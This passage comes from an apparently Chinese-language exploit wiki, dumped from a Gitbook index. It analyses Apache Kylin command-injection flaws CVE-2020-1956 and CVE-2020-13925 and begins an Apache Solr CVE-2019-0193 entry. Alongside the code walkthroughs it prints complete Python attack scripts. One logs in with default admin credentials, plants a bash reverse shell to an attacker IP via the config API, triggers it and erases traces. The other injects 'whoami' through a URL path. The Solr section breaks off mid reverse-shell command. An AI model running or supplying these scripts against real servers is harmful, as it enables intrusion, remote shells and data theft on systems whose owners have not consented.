@PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") public void migrateCube(CubeInstance cube, String projectName) { KylinConfig config = cube.getConfig(); if (!config.isAllowAutoMigrateCube()) { throw new InternalErrorException(\"One click migration is disabled, please contact your ADMIN\"); } for (CubeSegment segment : cube.getSegments()) { if (segment.getStatus() != SegmentStatusEnum.READY) { throw new InternalErrorException( \"At least one segment is not in READY state. Please check whether there are Running or Error jobs.\"); } } String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); String stringBuilderstringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } PreAuthorizeé‡Œé¢å®šä¹‰äº†è·¯ç”±æƒé™ï¼ŒADMINæƒé™ã€ADMINISTRATIONæƒé™å’ŒMANAGEMENTæƒé™å¯ä»¥è®¿é—®è¯¥serviceã€‚ @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") åœ¨1087è¡Œåˆ¤æ–­æ˜¯å¦å¼€å¯äº†MigrateCubeè®¾ç½®ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯åˆ™ä¼šæŠ¥é”™ è·Ÿè¿› isAllowAutoMigrateCube() è¿™ä¸ªå‡½æ•° å¯ä»¥çœ‹åˆ°è¿™é‡Œé»˜è®¤çš„é…ç½®kylin.tool.auto-migrate-cube.enabled å°±æ˜¯Flase public boolean isAllowAutoMigrateCube() { return Boolean.parseBoolean(getOptional(\"kylin.tool.auto-migrate-cube.enabled\", FALSE)); } åœ¨æ²¡æœ‰å¼€å¯é…ç½®kylin.tool.auto-migrate-cube.enabledä¸ºtrueçš„æƒ…å†µä¸‹ï¼Œè°ƒç”¨MigrateCubeåˆ™ä¼šå‡ºç°æŠ¥é”™ é€šè¿‡Apache Kylinçš„SYSTEMæ¨¡å—å¼€å¯kylin.tool.auto-migrate-cube.enabledä¸ºTrue è®¾ç½®åå†å»è¯·æ±‚åˆ™ä¸ä¼šå‡ºç°åˆšåˆšçš„æŠ¥é”™ï¼Œè€Œæ˜¯å‡ºç°Source configuration should not be empty è·Ÿè¿›å‡ºç°æŠ¥é”™è¯­å¥çš„ä»£ç å— String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); è¿™é‡Œè¿›è¡Œäº†å¯¹kylin.tool.auto-migrate-cube.src-configå’Œkylin.tool.auto-migrate-cube.dest-configçš„é…ç½®è¿›è¡Œäº†æ£€æµ‹ ,å¦‚æœä¸ºç©ºåˆ™ä¼šå‡ºç°åˆšåˆšçš„æŠ¥é”™ è·Ÿè¿› getAutoMigrateCubeSrcConfig()å’ŒgetAutoMigrateCubeDestConfig()å‡½æ•° public String getAutoMigrateCubeSrcConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.src-config\", \"\"); } public String getAutoMigrateCubeDestConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.dest-config\", \"\"); } å‘ç°è¿™ä¸¤ä¸ªé…ç½®é»˜è®¤ä¸ºç©ºï¼Œå› ä¸ºé…ç½®å…è®¸è‡ªå®šä¹‰ï¼Œæ‰€ä»¥srcCfgUriå’ŒdstCfgUriä¸¤ä¸ªå˜é‡å‡æ˜¯å¯æ§çš„ ç»§ç»­å‘ä¸‹èµ°ï¼Œå‘ç°ä¸€å¤„å‘½ä»¤æ‹¼æ¥ String stringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } è¿›å…¥åˆ°executeå‡½æ•° private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } ç”±æ­¤å¯ä»¥å¾—å‡ºæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªå¯æ§çš„å‚æ•°ï¼Œæ‰§è¡Œä»»æ„æˆ‘ä»¬éœ€è¦çš„å‘½ä»¤ï¼Œä¾‹å¦‚åå¼¹ä¸€ä¸ªshellï¼Œè®¾ç½®çš„é…ç½®ä¸º [!NOTE] kylin.tool.auto-migrate-cube.enabled=true kylin.tool.auto-migrate-cube.src-config=echo;bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 kylin.tool.auto-migrate-cube.dest-config=shell å†å»å‘é€POSTè¯·æ±‚ /kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate æˆåŠŸåå¼¹ä¸€ä¸ªshell æ¼æ´åˆ©ç”¨POC [!NOTE] POCåˆ©ç”¨å‰ææ˜¯æ‹¥æœ‰è´¦å·å¯†ç ï¼Œé»˜è®¤è´¦å·å¯†ç æ˜¯ admin/KYLIN #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(æ ¼å¼ä¸ºUser:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] è´¦å·å¯†ç å‡ºç°é”™è¯¯ \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] æˆåŠŸç™»å½•ï¼Œè·å¾—JSESSIONIDï¼š\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"],Authorization except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, cookie, IP, PORT, Authorization): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\",\"kylin.tool.auto-migrate-cube.src-config\",\"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"true\",\"echo;bash -i >& /dev/tcp/{}/{} 0>&1;echo\".format(IP, PORT), \"shell\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\"+cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸå°†\" + key[i] +\"è®¾ç½®ä¸º\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] è®¾ç½®\" + key[i] +\"ä¸º\" + value[i] +\"å¤±è´¥\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) def POC_3(target_url, cookie): print(\"\\033[35m[o] æ­£åœ¨åå¼¹shell......\\033[0m\") vuln_url = target_url + \"/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.post(url=vuln_url, headers=headers) POC_4(target_url, cookie) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) def POC_4(target_url, cookie): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\", \"kylin.tool.auto-migrate-cube.src-config\", \"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"flase\", \"echo;echo;echo\", \"None\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸå°†\" + key[i] +\"è®¾ç½®ä¸º\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] è®¾ç½®\" + key[i] +\"ä¸º\" + value[i] +\"å¤±è´¥\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) print(\"\\033[35m[o] æˆåŠŸæ¸…ç†ç—•è¿¹\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie,Authorization = POC_1(target_url) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_2(target_url, cookie, IP, PORT, Authorization) POC_3(target_url, cookie) å‚è€ƒæ–‡ç«  Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 POC åˆ†æ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-13925.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Kylin/Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-13925.html","title":"Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-CVE-2020-13925","keywords":"","body":"Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-13925 æ¼æ´æè¿° 6æœˆï¼Œäº¬ä¸œå®‰å…¨çš„è“å†›å›¢é˜Ÿå‘ç°äº†ä¸€ä¸ª apache kylin è¿œç¨‹å‘½ä»¤æ‰§è¡Œä¸¥é‡æ¼æ´ï¼ˆ CVE-2020-13925ï¼‰ã€‚é»‘å®¢å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œç™»å½•ä»»ä½•ç®¡ç†å‘˜è´¦å·å’Œå¯†ç é»˜è®¤æœªä¿®æ”¹çš„è´¦å·ï¼Œè·å¾—ç®¡ç†å‘˜æƒé™ã€‚ç”±äºApache Kylinè¢«å¹¿æ³›åº”ç”¨äºä¼ä¸šçš„å¤§æ•°æ®åˆ†æå¹³å°ï¼Œå› æ­¤è¯¥æ¼æ´å°†å¯¹ä¼ä¸šæ ¸å¿ƒæ•°æ®å…·æœ‰è¾ƒå¤§çš„å±å®³ï¼Œå­˜åœ¨æ•°æ®æ³„éœ²é£é™©ï¼Œå»ºè®®ç”¨æˆ·å°½å¿«å‡çº§è½¯ä»¶è‡³å®‰å…¨ç‰ˆæœ¬ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1,Kylin 3.0.2 ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨ docker æ¥æ­å»ºéœ€è¦çš„ç¯å¢ƒ Kylinå®˜æ–¹æ–‡æ¡£ docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] å¦‚æœæœåŠ¡å™¨å†…å­˜è¾ƒå°ï¼Œå¯ä¸é€‰æ‹© -m 8G å‚æ•° docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 æ‰“å¼€åä½¿ç”¨é»˜è®¤è´¦å·å¯†ç admin/KYLINç™»å½•ï¼Œå‡ºç°åˆå§‹ç•Œé¢å³ä¸ºæˆåŠŸ æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„ä»£ç æ–‡ä»¶åœ¨server-base/src/main/java/org/apache/kylin/rest/controller/DiagnosisController.java /** * Get diagnosis information for project */ @RequestMapping(value = \"/project/{project}/download\", method = { RequestMethod.GET }, produces = { \"application/json\" }) @ResponseBody public void dumpProjectDiagnosisInfo(@PathVariable String project, final HttpServletRequest request, final HttpServletResponse response) { try (AutoDeleteDirectory diagDir = new AutoDeleteDirectory(\"diag_project\", \"\")) { String filePath = dgService.dumpProjectDiagnosisInfo(project, diagDir.getFile()); setDownloadResponse(filePath, response); } catch (IOException e) { throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); } } è¿™é‡Œå¯ä»¥çœ‹åˆ° {project}å‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„å˜é‡ï¼Œå‘ä¸‹è·Ÿè¿›dumpProjectDiagnosisInfoå‡½æ•° public String dumpProjectDiagnosisInfo(String project, File exportPath) throws IOException { aclEvaluate.checkProjectOperationPermission(project); String[] args = { project, exportPath.getAbsolutePath() }; runDiagnosisCLI(args); return getDiagnosisPackageName(exportPath); } é¦–å…ˆé€šè¿‡checkProjectOperationPermissionå‡½æ•°æ¥æ£€æŸ¥è¯¥projectæ˜¯å¦è®¸å¯ï¼Œç„¶åæ„å»ºä¸€ä¸ªargsçš„å­—ç¬¦ä¸²æ•°ç»„ï¼Œçœ‹ä¸€ä¸‹checkProjectOperationPermissionå‡½æ•° public void checkProjectOperationPermission(String projectName) { ProjectInstance projectInstance = getProjectInstance(projectName); aclUtil.hasProjectOperationPermission(projectInstance); } è¿™é‡Œä¼ å…¥projectNameï¼Œç„¶åé€šè¿‡getProjectInstanceæ¥è·å–é¡¹ç›®å®ä¾‹,è·Ÿè¿›getProjectInstance private ProjectInstance getProjectInstance(String projectName) { return ProjectManager.getInstance(KylinConfig.getInstanceFromEnv()).getProject(projectName); } å› ä¸º projectName ä¼šè¢«æˆ‘ä»¬æ›¿æ¢æ‰ï¼Œæ‰€ä»¥ä¸ä¼šè·å¾—ä¸€ä¸ªæ­£ç¡®çš„projectName,åˆ™ä¼šè¿”å›ä¸€ä¸ªNullï¼ŒæŸ¥çœ‹ä¸‹hasProjectOperationPermissionå‡½æ•° @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#project, 'ADMINISTRATION')\" + \" or hasPermission(#project, 'MANAGEMENT')\" + \" or hasPermission(#project, 'OPERATION')\") public boolean hasProjectOperationPermission(ProjectInstance project) { return true; } è¿™é‡Œå¹¶æ²¡æœ‰å¯¹projectNameè¿›è¡Œæ£€éªŒï¼Œåªå¯¹ç”¨æˆ·èº«ä»½è¿›è¡Œäº†æ£€éªŒï¼Œå½“ä¸ºADMINã€ADMINISTRATIONã€MANAGEMENTã€OPERATIONç­‰æƒé™ï¼Œè¯¥å€¼é»˜è®¤è¿”å›ä¸ºtrueï¼Œå›åˆ° dumpProjectDiagnosisInfoå‡½æ•°ï¼Œå‘ä¸‹ç»§ç»­è·Ÿè¿›runDiagnosisCLIå‡½æ•° private void runDiagnosisCLI(String[] args) throws IOException { Message msg = MsgPicker.getMsg(); File cwd = new File(\"\"); logger.debug(\"Current path: \" + cwd.getAbsolutePath()); logger.debug(\"DiagnosisInfoCLI args: \" + Arrays.toString(args)); File script = new File(KylinConfig.getKylinHome() + File.separator + \"bin\", \"diag.sh\"); if (!script.exists()) { throw new BadRequestException( String.format(Locale.ROOT, msg.getDIAG_NOT_FOUND(), script.getAbsolutePath())); } String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair cmdOutput = executor.execute(diagCmd); if (cmdOutput.getFirst() != 0) { throw new BadRequestException(msg.getGENERATE_DIAG_PACKAGE_FAIL()); } } æ³¨æ„çœ‹è¿™å‡ è¡Œä»£ç  String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair cmdOutput = executor.execute(diagCmd); ä¸ Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 ç±»ä¼¼ï¼ŒåŒæ ·ä¹Ÿæ˜¯ç»è¿‡executeå‡½æ•°ï¼Œè€ŒdigCmdåŒæ ·ä¹Ÿæ˜¯ç»è¿‡äº†å‘½ä»¤æ‹¼æ¥ private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ§åˆ¶ {project} è¯·æ±‚å°±å¯ä»¥é€ æˆå‘½ä»¤æ³¨å…¥ /kylin/api/diag/project/{project}/download /kylin/api/diag/project/||ping `whoami.111.111.111`||/download æ‹¼æ¥ååˆ™å‡ºç° /home/admin/apache-kylin-3.0.1-bin-hbase1x/bin/diag.sh {project} {diagDir} è¿™é‡Œé€šè¿‡æŠ¥é”™è¯­å¥å¯ä»¥å›æ˜¾å‘½ä»¤éªŒè¯æ¼æ´å­˜åœ¨ throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); åœ¨ä¿®å¤ä¸­ï¼Œè¿‡æ»¤äº†||,&&ç­‰ç¬¦å·ï¼Œé€ æˆæ— æ³•å‘½ä»¤æ³¨å…¥ æ¼æ´é€šæŠ¥ä¸­å…±ä¸¤ä¸ªåˆ©ç”¨ç‚¹ /kylin/api/diag/project/{project}/download /kylin/api/diag/job/{jobId}/download æŸ¥çœ‹å‡½æ•°å‘ç°åˆ©ç”¨æ–¹å¼ç›¸åŒï¼Œç›´æ¥åˆ©ç”¨jobä¼šå¤±è´¥ï¼Œå› ä¸º {project}é»˜è®¤æœ‰ä¸€ä¸ªlearn_kylinï¼Œè€Œjobæ²¡æœ‰ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(æ ¼å¼ä¸ºUser:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] è´¦å·å¯†ç å‡ºç°é”™è¯¯ \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] æˆåŠŸç™»å½•ï¼Œè·å¾—JSESSIONIDï¼š\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"] except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, cookie): vuln_url = target_url + '/kylin/api/diag/project/%7C%7Cping%20%60whoami%60.111.111.111%7C%7C/download' headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \".111.111.111||\" in response.text: whoami = re.findall(r'ping: (.*?).111.111.111: æœªçŸ¥çš„åç§°æˆ–æœåŠ¡',response.text)[0] print(\"\\033[32m[o] å­˜åœ¨æ¼æ´ï¼ŒæˆåŠŸæ‰§è¡Œwhoamiï¼Œå“åº”ä¸º{}\\033[0m\".format(whoami)) else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥,||,&&ç­‰ç¬¦å·å·²è¢«è¿‡æ»¤ï¼Œæ— æ³•é€ æˆå‘½ä»¤æ³¨å…¥\\033[0m\") except: print(\"\\033[31m[x] è¯·æ±‚è¶…æ—¶\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie = POC_1(target_url) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) POC_2(target_url, cookie) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/","title":"Apache Solr","keywords":"","body":"Apache Solr Apache Solr RCE è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193 Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-12629 Apache Solr XXE æ¼æ´ CVE-2017-12629 Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409 Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193.html","title":"Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193","keywords":"","body":"Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193 æ¼æ´æè¿° 2019 å¹´ 08 æœˆ 01 æ—¥ï¼ŒApache Solr å®˜æ–¹å‘å¸ƒé¢„è­¦ï¼ŒApache Solr DataImport åŠŸèƒ½ åœ¨å¼€å¯ Debug æ¨¡å¼æ—¶ï¼Œå¯ä»¥æ¥æ”¶æ¥è‡ªè¯·æ±‚çš„â€dataConfigâ€å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°çš„åŠŸèƒ½ä¸data-config.xml ä¸€æ ·ï¼Œä¸è¿‡æ˜¯åœ¨å¼€å¯ Debug æ¨¡å¼æ—¶æ–¹ä¾¿é€šè¿‡æ­¤å‚æ•°è¿›è¡Œè°ƒè¯•ï¼Œå¹¶ä¸” Debug æ¨¡å¼çš„å¼€å¯æ˜¯é€šè¿‡å‚æ•°ä¼ å…¥çš„ã€‚åœ¨ dataConfig å‚æ•°ä¸­å¯ä»¥åŒ…å« script æ¶æ„è„šæœ¬å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-0193 docker-compose build docker-compose up -d # åˆ›å»ºä¸€ä¸ªsolræ ¸å¿ƒtest docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° ç‚¹å‡»åˆšåˆšåˆ›å»ºçš„testè¿›å…¥è°ƒè¯• å°†ä¸‹é¢çš„POCä»£ç å¡«å…¥ Debug-Mode ä¸­ æ³¨æ„ POC æ‰§è¡Œçš„ä»£ç ä¸­çš„base64å­—ç¬¦ä¸²çš„ä½ç½®è¯·ç½®æ¢æˆè‡ªå·±çš„ipåœ°å€å¹¶base64åŠ å¯†å¡«å…¥ [!NOTE] bash -i >& 